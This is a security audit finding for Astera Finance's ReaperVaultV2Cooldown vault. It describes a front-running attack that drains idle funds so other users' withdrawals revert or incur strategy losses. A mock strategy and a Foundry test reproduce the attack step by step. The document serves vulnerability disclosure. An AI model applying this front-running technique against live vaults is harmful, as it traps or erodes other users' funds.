# Astera-Finance
Astera Finance || An ERC721-based withdraw cooldown mechanism || 28 August 2025 to 1 Sep 2025 

My Finding Summay
|ID|Title|Severity|
|:-:|:---|:------:|
|[M-01](#m-01-an-attacker-can-DOS-withdrawals-and-force-losses-on-other-users-by-frontrunning-with-large-withrawals-in-`Reapervaultv2cooldown.sol`)|An attacker can DOS withdrawals and force losses on othher users by frontrunning with large withrawals in `Reapervaultv2cooldown.sol`.|MEDIUM|


## [M-01] An attacker can DOS withdrawals and force losses on othher users by frontrunning with large withrawals in `Reapervaultv2cooldown.sol`.

###  Description

In the `ReaperVaultV2Cooldown.sol`, the `_withdraw` function processes withdrawals by first pulling from `totalIdle`, then iterating through `withdrawalQueue` to cover remaining funds, with a `strict slippage check (withdrawMaxLoss)`. If a strategy incurs losses exceeding `withdrawMaxLoss (default 0.01%)`, the withdrawal reverts. This allows an attacker to front-run a victim’s withdrawal by consuming `totalIdle` with large withdrawals, forcing the victim to pull from a `lossy strategy`, resulting in either:

- DoS: The victim’s withdrawal reverts when the losses exceed `withdrawMaxLoss`.

- Forced Loss: When admins increase `withdrawMaxLoss` to allow withdrawals, victims incur more losses than the required from the strategy.

This creates a scenario where attackers can exploit the shared `idle fund pool` and withdrawal cooldown mechanism to either permanently trap victim funds (DoS) or force victims to accept financial losses. The attack leverages the first-come-first-served nature of idle fund access combined with strict slippage protection to create a lose-lose scenario for other users.

Root Cause in `_withdraw`:
```solidity
// In _withdraw() function (lines 482-523)
uint256 vaultBalance = totalIdle;  // Shared pool vulnerable to depletion
if (value > vaultBalance) {        // Attacker forces this condition
    // Forces victim into strategy withdrawal with losses
    uint256 loss = IStrategy(stratAddr).withdraw(...);
    if (loss != 0) {
        value -= loss;  //<-----------------  VICTIM LOSES MONEY
        totalLoss += loss;
    }
    require(
        totalLoss <= ((value + totalLoss) * withdrawMaxLoss) / PERCENT_DIVISOR,
        "Withdraw loss exceeds slippage"  // <------------ DoS CONDITION
    );
}
```
My PoC demonstrates this by:
- Depositing `1500e18 (attacker: 1000e18, victim1: 500e18).`
- Allocating `750e18` to a strategy with `1%` loss.
- Attacker frontrun and withdraws `700e18`, leaving `50e18` in totalIdle.
- Victim1’s `200e18` withdrawal requires `150e18` from the strategy, incurring a `1.5e18` loss, which:

- Reverts with `withdrawMaxLoss=1 BPS` (DoS).
- Succeeds with `withdrawMaxLoss=200 BPS`, forcing a `1.5e18` loss.

### Impact:

1. Denial of Service (DoS): Victims’ funds are temporarily locked if `totalIdle` is insufficient and strategy losses exceed `withdrawMaxLoss`. Withdrawals remain blocked until admins increase slippage. 

2. Forced Losses:Increasing `withdrawMaxLoss ( to 2%)` allows withdrawals but forces victims to accept losses `(e.g., 1% on strategy pulls)`, eroding user funds. This happens, when admin updates the `withdrawMaxLoss` to allows the success of withdrawals, but by doing this, massive losses are forced on users. 

### Severity:
-  Medium. While funds are not permanently lost, the DoS locks user capital, and forced losses reduce user balances. 

## Mitigation

- Implement a per-transaction withdrawal cap `(e.g., max 10% of totalIdle + totalAllocated)` to limit how much `totalIdle` an attacker can consume, ensuring victims can access idle funds.

### Proof of concept

Create a file, `StrategyMock.sol` and add this code to it to simulate strategy losses. 

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.0;

import {IStrategy} from "../../../../src/interfaces/IStrategy.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";

contract StrategyMock is IStrategy {
    address public vaultAddress;
    address public wantAddress;
    uint256 public availableLiquidity = type(uint256).max;
    uint256 public withdrawLossPercent = 0; // BPS (0-10000)

    function withdraw(uint256 _amount) external returns (uint256 loss) {
        require(msg.sender == vaultAddress, "Only vault can withdraw");
        
        IERC20 token = IERC20(wantAddress);
        uint256 available = availableLiquidity;
        uint256 toTransfer = _amount;
        
        // Check if we have enough liquidity
        if (_amount > available) {
            // Strategy doesn't have enough liquidity - can only provide what's available
            toTransfer = available;
            loss = _amount - available; // Loss due to insufficient liquidity
        }
        
        // Simulate withdrawal losses (slippage, etc.) on the amount we can actually transfer
        // This ensures losses are reasonable and don't cause underflow in the vault
        if (withdrawLossPercent > 0 && toTransfer > 0) {
            uint256 withdrawalLoss = (toTransfer * withdrawLossPercent) / 10000;
            loss += withdrawalLoss;
            // Reduce the transfer amount by the slippage loss
            toTransfer = toTransfer - withdrawalLoss;
        }
        
        // Transfer available tokens to vault (this is what actualWithdrawn will be)
        if (toTransfer > 0) {
            token.transfer(vaultAddress, toTransfer);
            availableLiquidity -= toTransfer;
        }
        
        return loss;
    }

    function harvest() external returns (int256 roi) {}

    function balanceOf() external view returns (uint256) {
        return availableLiquidity;
    }
    
    // Test helper functions
    function setAvailableLiquidity(uint256 _amount) external {
        availableLiquidity = _amount;
    }
    
    function setWithdrawLossPercent(uint256 _lossPercent) external {
        require(_lossPercent <= 10000, "Loss percent cannot exceed 100%");
        withdrawLossPercent = _lossPercent;
    }

    function setVaultAddress(address vaultAddress_) external {
        vaultAddress = vaultAddress_;
    }

    function vault() external view returns (address) {
        return vaultAddress;
    }

    function setWantAddress(address wantAddress_) external {
        wantAddress = wantAddress_;
    }

    function want() external view returns (address) {
        return wantAddress;
    }

    function approveVaultSpender() external returns (bool) {
        return IERC20(wantAddress).approve(vaultAddress, type(uint256).max);
    }
}
```

After, create another file and add this test to it to test the vul.

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.0;

import {VaultBaseTest} from "./VaultBase.t.sol";
import {ReaperERC721WithdrawCooldown} from "../../../src/ReaperERC721WithdrawCooldown.sol";
import {StrategyMock} from "./mock/StrategyMock.sol";
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC721Receiver} from "oz/token/ERC721/IERC721Receiver.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";
import {ReaperVaultV2Cooldown} from "../../../src/ReaperVaultV2Cooldown.sol";



contract VaultCooldownTest is VaultBaseTest {
       function testFrontRunningAttackDoSAndForcedLoss() public {
        address attacker = makeAddr("attacker");
        address victim1 = makeAddr("victim1");
        
        // Setup users with deposits
        deal(address(assetMock), attacker, 1000e18);
        deal(address(assetMock), victim1, 500e18);

        // All users deposit
        vm.startPrank(attacker);
        assetMock.approve(address(sut), 1000e18);
        sut.deposit(1000e18);
        vm.stopPrank();

        vm.startPrank(victim1);
        assetMock.approve(address(sut), 500e18);
        sut.deposit(500e18);
        vm.stopPrank();

        // Setup strategy with loss
        StrategyMock lossyStrategy = new StrategyMock();
        lossyStrategy.setVaultAddress(address(sut));
        lossyStrategy.setWantAddress(address(sut.token()));

        vm.startPrank(DEFAULT_ADMIN.addr);
        sut.addStrategy(address(lossyStrategy), 1000, 5000); // 50% allocation
        vm.stopPrank();

        // Strategy gets allocated funds (50% of 1500e18 total deposits = 750e18)
        deal(address(assetMock), address(lossyStrategy), 750e18);
        lossyStrategy.approveVaultSpender();
        
        vm.startPrank(address(lossyStrategy));
        sut.report(0, 0); // Trigger allocation: totalIdle becomes 750e18
        vm.stopPrank();

        // Configure strategy with 1% loss rate
        lossyStrategy.setWithdrawLossPercent(100); // 1% loss
        deal(address(assetMock), address(lossyStrategy), 750e18);
        lossyStrategy.approveVaultSpender();

        // === PART 1: DEMONSTRATE DoS ATTACK (Strict Slippage) ===
        // Default slippage is 0.01% (1 BPS), strategy has 1% loss rate
        
        // Attacker and victim initiate withdrawals
        vm.startPrank(attacker);
        sut.initiateWithdraw(700e18); // Consume most idle funds, leaving only 50e18
        vm.stopPrank();

        vm.startPrank(victim1);
        sut.initiateWithdraw(200e18); // Will be forced into strategy loss (200e18 > 50e18 idle)
        vm.stopPrank();

        skip(sut.cooldownPeriod() + 1);

        ReaperERC721WithdrawCooldown nft = sut.withdrawCooldownNft();
        uint256 attackerTokenId = nft.tokenOfOwnerByIndex(attacker, 0);
        uint256 victim1TokenId = nft.tokenOfOwnerByIndex(victim1, 0);

        // Attacker withdraws successfully using idle funds (no strategy interaction)
        vm.startPrank(attacker);
        sut.withdraw(attackerTokenId);
        vm.stopPrank();

        // Verify remaining idle funds are insufficient for victim1
        uint256 remainingIdle = sut.totalIdle();
        assertTrue(remainingIdle < 200e18, "Idle funds should be insufficient for victim1");

        // Victim1 CANNOT withdraw - DoS due to strict slippage (1% strategy loss > 0.01% limit)
        vm.startPrank(victim1);
        vm.expectRevert("Withdraw loss exceeds slippage");
        sut.withdraw(victim1TokenId);
        vm.stopPrank();

        // === PART 2: DEMONSTRATE FORCED LOSS ATTACK (Loose Slippage) ===
        // Admin increases slippage to "help" victim1, but this forces them to accept losses
        
        vm.startPrank(STRATEGIST.addr);
        sut.updateWithdrawMaxLoss(200); // 2% slippage tolerance (allows 1% strategy loss)
        vm.stopPrank();

        // Now victim1 CAN withdraw but will lose money due to strategy interaction
        uint256 victim1BalanceBefore = assetMock.balanceOf(victim1);
        
        vm.startPrank(victim1);
        sut.withdraw(victim1TokenId); // Succeeds but with forced losses
        vm.stopPrank();
        
        uint256 victim1BalanceAfter = assetMock.balanceOf(victim1);
        uint256 victim1Received = victim1BalanceAfter - victim1BalanceBefore;
        uint256 victim1Loss = 200e18 - victim1Received;
        
        // Verify the attack succeeded - victim1 was forced to accept losses
        assertTrue(victim1Loss > 0, "Victim1 should have incurred losses");
        assertTrue(victim1Loss >= (200e18 * 70) / 10000, "Loss should be ~0.75% (strategy loss on portion)");
        
        // ATTACK SUMMARY:
        // 1. Attacker front-ran victim's withdrawal by consuming idle funds
        // 2. Forced victim into lossy strategy withdrawal 
        // 3. With strict slippage: Victim funds TRAPPED (DoS)
        // 4. With loose slippage: Victim FORCED to accept losses
        // 5. Attacker benefits either way - gets clean withdrawal while harming others
    }
}    
```